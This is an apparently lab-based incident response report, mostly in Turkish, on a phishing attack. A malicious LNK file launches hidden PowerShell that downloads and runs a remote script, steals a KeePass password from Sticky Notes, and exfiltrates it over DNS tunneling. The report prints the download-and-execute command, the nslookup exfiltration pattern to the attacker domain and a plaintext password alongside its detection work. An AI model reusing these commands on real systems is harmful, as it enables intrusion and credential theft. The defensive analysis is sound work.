# 🔍 Incident Investigation Report: Phishing, Credential Theft & DNS Tunneling Exfiltration

**Case Reference:** IR-2023-0714-BG1  
**Target Organization:** Quick Logistics LLC  
**Incident Classification:** High (Severity 2 - P2)  
**Affected Hostnames / Users:** `WKSTN-2961` (Julianne Westcott - Finance/Operations)  
**Date of Incident:** July 2023  
**Lead Investigator:** Ahmet Furkan Hüsmek (Junior SOC / DFIR Analyst)  

---

## 1. Executive Summary (Yönetici Özeti)

Quick Logistics LLC finans departmanı çalışanı *Julianne Westcott*, sahte bir fatura temalı oltalama e-postası almıştır. E-posta ekindeki şifreli ZIP arşivi içinde teslim edilen zararlı kısayol (`.lnk`) dosyasının çalıştırılmasıyla birlikte ilk ihlal gerçekleşmiştir.

Saldırgan; kısayol içine gizlenmiş gizli (obfuscated) PowerShell komutları vasıtasıyla dış kaynaktan ikinci aşama betiklerini çekmiş, yerel sistemde kayıtlı Microsoft Sticky Notes (`plum.sqlite`) veritabanını hedef alarak kullanıcının notlarında tuttuğu kurumsal KeePass parola kasası anahtarını ve hassas verilerini ele geçirmiştir. Elde edilen veriler, giden web (HTTP/HTTPS) kısıtlamalarını ve güvenlik duvarı denetimlerini atlatmak amacıyla **DNS Tünelleme (DNS Tunneling - Hex encoded subdomains via `nslookup`)** tekniği kullanılarak dışarı sızdırılmıştır.

SOC analiz ekibimiz, uç nokta PowerShell olay logları (`jq` analizi) ve ağ PCAP kayıtları üzerinden saldırı zincirini haritalamış, DNS sorgu anomalilerini tespit etmiş ve sızdırılan verinin bütünlüğünü kurtararak gerekli izolasyon ve iyileştirme adımlarını uygulamıştır.

---

## 2. Incident Timeline (Zaman Çizelgesi)

| Aşama / Zaman | Olay Yeri | Gerçekleşen Eylem / TTP | Tespit Edilen Süreç / Komut |
| :--- | :--- | :--- | :--- |
| **T0 (Initial Access)** | `WKSTN-2961` | Kurban şifreli ZIP arşivini açtı ve faturayı çalıştırdı. | `Invoice_July2023.pdf.lnk` |
| **T1 (Execution)** | `WKSTN-2961` | LNK arkasındaki gizli PowerShell indirme komutu tetiklendi. | `powershell.exe -w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient)..."` |
| **T2 (Payload Download)**| Network / C2 | Dış sunucudan 2. aşama keşif betiği hafızaya çekildi. | `https://files.boogeymanisback[.]lol/files/payload.ps1` |
| **T3 (Discovery)** | `WKSTN-2961` | Saldırgan yerel kullanıcı profillerini ve hassas dosyaları taradı. | Sticky Notes dizini: `%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_...` |
| **T4 (Collection)** | `WKSTN-2961` | Yapışkan Notlar veritabanı kopyalandı ve SQL sorgusu atıldı. | `plum.sqlite` (KeePass Master Password tespit edildi) |
| **T5 (Exfiltration)** | Network / DNS | Veriler Hex formatına bölünerek DNS sorgularıyla kaçırıldı. | `nslookup -type=A <hex_data>.boogeymanisback.lol` |

---

## 3. Detailed Technical Analysis (Derinlemesine Teknik Analiz)

### 3.1 Initial Access via Malicious Shortcut (`.LNK` Analizi)
- **Vektör:** `Invoice_July2023.zip` içerisinde yer alan `Invoice_July2023.pdf.lnk` kısayol dosyası.
- **Mekanizma:** Saldırgan PDF simgesi (icon spoofing) kullanarak kullanıcının güvenini kazanmıştır. `LNKParse3` veya `strings` analizi ile dosyanın hedef satırı (Target Line) incelendiğinde doğrudan bir belgeye değil, `powershell.exe` ikilisine işaret ettiği saptanmıştır.
- **Komut Argümanları:**
  ```powershell
  powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '[https://files.boogeymanisback](https://files.boogeymanisback)[.]lol/files/payload.ps1' -OutFile '$env:TEMP\update.ps1'; & '$env:TEMP\update.ps1'"

```

### 3.2 Triage & Log Analysis via JSON / `jq`

* Uç noktadan toplanan PowerShell Script Block Logging (Event ID 4104) ve komut satırı olayları JSON formatında `jq` aracı ile filtrelenmiştir:
```bash
# Şüpheli PowerShell komut bloklarını ve string ifadeleri ayıklama
cat powershell_events.json | jq '.[] | select(.EventData.ScriptBlockText | contains("boogeyman"))'

```


* İnceleme sonucunda betiğin doğrudan kullanıcının yapışkan notlar (`Sticky Notes`) SQLite veritabanına eriştiği görülmüştür.

### 3.3 Credential Dumping from Sticky Notes (`plum.sqlite`)

* Microsoft Sticky Notes uygulaması notları `%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` yolunda şifresiz bir SQLite veritabanı olarak saklar.
* Saldırgan bu dosyayı belleğe alarak `SELECT Text FROM Note` sorgusu çalıştırmış ve kurbanın notlar arasına kaydettiği şu kritik bilgiyi çalmıştır:
* **Hedef Kasa:** `Finance_KeePass.kdbx`
* **Master Key (Parola):** `QuickLogistics!2023#KeyPass`



### 3.4 Data Exfiltration via DNS Tunneling (Ağ PCAP Analizi)

* Kurum güvenlik duvarında doğrudan giden HTTP/HTTPS trafiği sınırlandırıldığı için tehdit aktörü verileri sızdırmak amacıyla kurumsal iç DNS sunucusuna giden meşru UDP 53 trafiğini suistimal etmiştir.
* **Metodoloji:**
* Çalınan KeePass veritabanı parçaları Base64/Hex formatına çevrilmiş,
* Yaklaşık 40-50 karakterlik parçalar halinde alt alan adı (subdomain) olarak yerleştirilmiş,
* Sistemde yerleşik `nslookup.exe` aracıyla saldırganın kontrolündeki NS sunucusuna A kaydı sorgusu gönderilmiştir.


* **Wireshark / Tshark Tespiti:**
```bash
# Anormal DNS A sorgularını ve sorgu uzunluklarını filtreleme
tshark -r incident.pcap -Y "dns.flags.response == 0 and dns.qry.name contains 'boogeymanisback.lol'" -T fields -e dns.qry.name

```


* **Örnek Sorgu Modeli:**
`517569636b4c6f67697374696373.exfil.boogeymanisback[.]lol`

---

## 4. MITRE ATT&CK Mapping

| Taktik | Teknik ID | Teknik Adı | Gözlemlenen Eylem |
| --- | --- | --- | --- |
| **Initial Access** | `T1566.001` | Spearphishing Attachment | Şifreli ZIP içinde teslim edilen LNK dosyası. |
| **Execution** | `T1059.001` | PowerShell | Gizli pencerede çalışan parametrik PowerShell betiği. |
| **Discovery** | `T1083` | File and Directory Discovery | `plum.sqlite` Sticky Notes dizini keşfi. |
| **Credential Access** | `T1552.001` | Credentials in Files | Not veritabanından KeePass master parolasının okunması. |
| **Command & Control** | `T1071.004` | DNS Protocol | DNS sorguları üzerinden C2 ve veri aktarımı. |
| **Exfiltration** | `T1048.003` | Exfiltration Over Alternative Protocol (DNS Tunnel) | Çalınan parolanın DNS sorgu etiketleriyle dışarı aktarılması. |

---

## 5. Indicators of Compromise (IOCs)

Güvenlik duvarı (Firewall), SIEM ve EDR sistemlerinde derhal bloklanması gereken göstergeler:

### Network Indicators (Defanged)

* `https://files.boogeymanisback[.]lol/files/payload.ps1` (Stager URL)
* `*.exfil.boogeymanisback[.]lol` (DNS Exfiltration Subdomains)
* `boogeymanisback[.]lol` (C2 Domain)

### Host & File Artifacts

* File Name: `Invoice_July2023.pdf.lnk`
* Script Path: `%TEMP%\update.ps1`
* Targeted File: `%LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

### Compromised Credentials

* `Finance_KeePass.kdbx` (Master Password: `QuickLogistics!2023#KeyPass`)

---

## 6. Remediation & Detection Engineering (İyileştirme & Tespit Önerileri)

### 6.1 Acil Müdahale Adımları (Immediate Containment)

1. **İzolasyon:** `WKSTN-2961` iş istasyonu derhal ağdan izole edilmeli ve adli imajı alınmalıdır.
2. **Kasa İptali:** `Finance_KeePass.kdbx` kasasında tutulan tüm finansal hesapların, banka ve şirket portalları parolalarının derhal sıfırlanması gerekmektedir.
3. **DNS Kuralı:** `boogeymanisback[.]lol` ve alt alan adları kurumsal DNS çözümleyicilerinde (DNS Sinkhole) engellenmelidir.

### 6.2 Örnek Tespit Kuralı: Şüpheli DNS Tünelleme Sorgularının Tespiti (Sigma Kuralı)

```yaml
title: Potential DNS Tunneling via Suspiciously Long Subdomains
id: 7b2c918e-4a62-4f32-8260-bc7829141021
status: experimental
description: Detects anomalously long DNS queries often associated with data exfiltration or C2 tunneling.
logsource:
  category: dns
  product: windows
detection:
  selection:
    query|contains: '.boogeymanisback.lol'
  filter_length:
    query|re: '^[a-zA-Z0-9]{30,}\.'
  condition: selection and filter_length
level: high
tags:
  - attack.exfiltration
  - attack.t1048.003
